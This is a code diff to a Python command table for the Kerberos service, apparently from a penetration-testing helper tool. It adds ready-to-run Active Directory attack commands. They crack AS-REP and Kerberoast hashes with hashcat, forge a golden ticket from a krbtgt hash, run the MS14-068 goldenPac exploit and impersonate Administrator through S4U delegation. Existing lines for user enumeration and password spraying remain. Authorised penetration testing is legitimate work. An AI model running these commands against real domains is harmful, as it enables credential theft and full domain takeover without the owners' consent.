@@ -4819,16 +4819,22 @@ _STEP_COMMANDS = {
         1: [
             "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <RHOST>",
             "kerbrute userenum -d <DOMAIN> --dc <RHOST> /usr/share/seclists/Usernames/Names/names.txt",
+            "sudo ntpdate <RHOST>   # sync clock first — fixes KRB_AP_ERR_SKEW",
         ],
         2: [
             "impacket-GetNPUsers <DOMAIN>/ -dc-ip <RHOST> -usersfile /usr/share/seclists/Usernames/Names/names.txt -no-pass",
             "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <RHOST> -request",
+            "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # crack AS-REP",
+            "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt    # crack Kerberoast (TGS)",
         ],
         3: [
             "kerbrute passwordspray -d <DOMAIN> --dc <RHOST> /usr/share/seclists/Usernames/Names/names.txt '<PASS>'",
         ],
         4: [
-            "# HackTricks Kerberos: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast",
+            "impacket-getTGT <DOMAIN>/<USER>:<PASS>   # then: export KRB5CCNAME=<USER>.ccache ; use -k on impacket tools (overpass-the-hash via -hashes)",
+            "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator   # golden ticket",
+            "impacket-goldenPac <DOMAIN>/<USER>:<PASS>@<TARGET-FQDN>   # MS14-068",
+            "impacket-getST -impersonate Administrator -spn cifs/<TARGET> <DOMAIN>/<USER>:<PASS>   # S4U / delegation",
         ],
     },
     "msrpc": {
